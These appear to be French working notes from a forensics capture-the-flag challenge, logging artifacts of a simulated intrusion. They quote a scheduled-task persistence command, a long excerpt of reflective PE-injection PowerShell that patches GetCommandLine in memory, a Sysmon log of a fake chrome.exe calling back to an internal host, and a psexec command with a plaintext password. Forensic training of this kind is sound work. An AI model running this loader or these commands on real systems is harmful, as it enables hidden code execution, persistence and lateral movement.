Fichiers intéressnats:

HF2025_forensics_APT_514/Artifacts/PC1/C/Windows/prefetch/

schtasks /Create /F /SC MINUTE /MO 3 /ST 18:00 /TN CheckMe /TR C:UsersPublicDownloadsCheckme.exe

Donne des trucs intéressnats: chainsaw search "powershell" Artifacts

"his function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE\r\n    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)\r\n    Function Update-ExeFunctions\r\n    {\r\n        Param(\r\n        [Parameter(Position = 0, Mandatory = $true)]\r\n        [System.Object]\r\n        $PEInfo,\r\n        \r\n        [Parameter(Position = 1, Mandatory = $true)]\r\n        [System.Object]\r\n        $Win32Functions,\r\n        \r\n        [Parameter(Position = 2, Mandatory = $true)]\r\n        [System.Object]\r\n        $Win32Constants,\r\n        \r\n        [Parameter(Position = 3, Mandatory = $true)]\r\n        [String]\r\n        $ExeArguments,\r\n        \r\n        [Parameter(Position = 4, Mandatory = $true)]\r\n        [IntPtr]\r\n        $ExeDoneBytePtr\r\n        )\r\n        \r\n        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.\r\n        $ReturnArray = @() \r\n        \r\n        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])\r\n        [UInt32]$OldProtectFlag = 0\r\n        \r\n        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"Kernel32.dll\")\r\n        if ($Kernel32Handle -eq [IntPtr]::Zero)\r\n        {\r\n            throw \"Kernel32 handle null\"\r\n        }\r\n        \r\n        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(\"KernelBase.dll\")\r\n        if ($KernelBaseHandle -eq [IntPtr]::Zero)\r\n        {\r\n            throw \"KernelBase handle null\"\r\n        }\r\n\r\n        #################################################\r\n        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.\r\n        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.\r\n        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)\r\n        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)\r\n    \r\n        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, \"GetCommandLineA\")\r\n        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, \"GetCommandLineW\")\r\n\r\n        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)\r\n        {\r\n            throw \"GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr\"\r\n        }\r\n\r\n        #Prepare the shellcode\r\n        [Byte[]]$Shellcode1 = @()\r\n        if ($PtrSize -eq 8)\r\n        {\r\n            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8\r\n        }\r\n        $Shellcode1 += 0xb8\r\n        \r\n        [Byte[]]$Shellcode2 = @(0xc3)\r\n        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length\r\n        \r\n        \r\n        #Make copy of GetCommandLineA and GetCommandLineW\r\n        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)\r\n        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)\r\n        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null\r\n        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null\r\n        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)\r\n        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)\r\n\r\n        #Overwrite GetCommandLineA\r\n        [UInt32]$OldProtectFlag = 0\r\n        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\r\n        if ($Success = $false)\r\n        {\r\n            throw \"Call to VirtualProtect failed\"\r\n        }\r\n        \r\n        $GetCommandLineAAddrTemp = $GetCommandLineAAddr\r\n        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp\r\n        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)\r\n        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)\r\n        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize\r\n        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp\r\n        \r\n        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null\r\n        \r\n        \r\n        #Overwrite GetCommandLineW\r\n        [UInt32]$OldProtectFlag = 0\r\n        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\r\n        if ($Success = $false)\r\n        {\r\n            throw \"Call to VirtualProtect failed\"\r\n        }\r\n        \r\n        $GetCommandLineWAddrTemp = $GetCommandLineWAddr\r\n        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp\r\n        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)\r\n        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)\r\n        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize\r\n        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp\r\n        \r\n        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null\r\n        #################################################\r\n        \r\n        \r\n        #################################################\r\n        #For C++ stuff that is compiled with visual studio as \"multithreaded DLL\", the above method of overwriting GetCommandLine doesn't work.\r\n        #   I don't know why exactly.. But the msvcr DLL that a \"DLL compiled executable\" imports has an export called _acmdln and _wcmdln.\r\n        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the\r\n        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.\r\n        $DllList = @(\"msvcr70d.dll\", \"msvcr71d.dll\", \"msvcr80d.dll\", \"msvcr90d.dll\", \"msvcr100d.dll\", \"msvcr110d.dll\", \"msvcr70.dll\" `\r\n            , \"msvcr71.dll\", \"msvcr80.dll\", \"msvcr90.dll\", \"msvcr100.dll\", \"msvcr110.dll\")\r\n        \r\n        foreach ($Dll in $DllList)\r\n        {\r\n            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)\r\n            if ($DllHandle -ne [IntPtr]::Zero)\r\n            {\r\n                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, \"_wcmdln\")\r\n                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, \"_acmdln\")\r\n                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)\r\n                {\r\n                    \"Error, couldn't find _wcmdln or _acmdln\"\r\n                }\r\n                \r\n                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)\r\n                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)\r\n                \r\n                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state\r\n                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])\r\n                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])\r\n                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)\r\n                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)\r\n                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)\r\n                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)\r\n                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)\r\n                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)\r\n                \r\n                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\r\n                if ($Success = $false)\r\n                {\r\n                    throw \"Call to VirtualProtect failed\"\r\n                }\r\n                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)\r\n                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null\r\n                \r\n                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\r\n                if ($Success = $false)\r\n                {\r\n                    throw \"Call to VirtualProtect failed\"\r\n                }\r\n                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)\

User tony:
"C:\Windows\system32\whoami.exe" /user

C:\Users\mark\Desktop\kape\KAPE\kape.exe

[ZoneTransfer]  ZoneId=3  ReferrerUrl=http://10.1.130.120/files/  HostUrl=http://10.1.130.120/files/chrome.exe  

Tried to ping back?
DestinationHostname: '-'
    DestinationIp: 10.1.130.120
    DestinationIsIpv6: false
    DestinationPort: 8888
    DestinationPortName: '-'
    Image: C:\Users\mark\Downloads\chrome.exe
    Initiated: true
    ProcessGuid: D776AE26-BD4B-68AF-9B06-000000004E01
    ProcessId: 7524
    Protocol: tcp
    RuleName: Usermode
    SourceHostname: PC1.safesecure.local
    SourceIp: 10.1.195.211
    SourceIsIpv6: false
    SourcePort: 62490
    SourcePortName: '-'
    User: SAFESECURE\mark
    UtcTime: 2025-08-28 02:22:04.895
(others similar)


psexec.exe \\dc.safesecure.local -u tony -p Complicated@123
